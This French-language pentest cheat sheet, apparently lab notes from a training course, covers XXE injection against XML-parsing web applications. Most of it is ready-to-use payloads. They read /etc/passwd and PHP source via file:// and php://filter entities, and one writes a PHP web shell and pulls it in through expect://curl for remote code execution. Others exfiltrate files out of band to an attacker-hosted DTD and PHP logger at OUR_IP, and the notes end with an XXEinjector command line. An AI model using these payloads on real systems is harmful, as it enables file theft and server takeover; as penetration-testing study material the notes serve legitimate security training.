
| Key           | Definition                                                                                                    | Example                                  |
| ------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | The keys of an XML document, usually wrapped with (`<`/`>`) characters.                                       | `<date>`                                 |
| `Entity`      | XML variables, usually wrapped with (`&`/`;`) characters.                                                     | `&lt;`                                   |
| `Element`     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| `Attribute`   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.     | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |

# Local File Disclosure

## Identifier

> [!TIP]
> Identifier une entrée utilisateur qui accepte du #XML
> Identifier les éléments qui sont réfléchis dans la réponse, ils serviront de point d'entrée.

DTD = Document Type Definition -> Définit la structure et les éléments et attributs du document XML.

Rajouter le DOCTYPE dont le DTD est email sous la première ligne (si non défini, si c'est le cas rajouter juste le ENTITY).

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Pointer vers l'Entité company déclarée dans le DOCTYPE et voir si la valeur indiquée est réfléchie dans la réponse -> Si c'est le cas alors vulnérable.

```xml
<email>
&company;
</email>
```

> [!TIP]
> Changer le content type si le format est en JSON et convertir les données JSON en XML
> 
> https://www.convertjson.com/json-to-xml.htm

## LFI (Local File Inclusion)

### Fichiers system

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<email>
&company;
</email>
```

> [!TIP]
> Possible de lister les dossier sur certaines applications JAVA

### Fichiers PHP

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<email>
&company;
</email>
```

---

## RCE (Remote Code Execution)

### PHP expect module -> permet d'executer des commandes

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<email>
&company;
</email>
```

> [!TIP]
> Eviter d'utiliser les caractères | > et { pour ne pas casser le code.

> [!TIP]
> TESTER SSRF

---

## Exfiltration avancée avec CDATA

> [!TIP]
> Permet d'insérer des fichiers contenant des caractères spéciaux, sans être limité au format PHP

```BASH
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE

> [!TIP]
> Référencer une entité qui n'existe pas ou modifier une balise pour générer une erreur

```BASH
echo '<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

---

# #Blind Data Exfiltration
## Out-of-band Data Exfiltration

Dans fichier xxe.dtd en local:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Dans fichier index.php en local:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Lancer serveur php:

```bash
php -S 0.0.0.0:8000
```

XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

> [!TIP]
> Voir DNS OOB Exfiltration

## Automated OOB Exfiltration

https://github.com/enjoiz/XXEinjector

Copier et enregistrer la requête HTTP depuis BURP et ecrire XXEINJECT sous la première ligne

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
ruby XXEinjector.rb --host=[IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Fichiers exfiltrés dans sous dossier "Logs"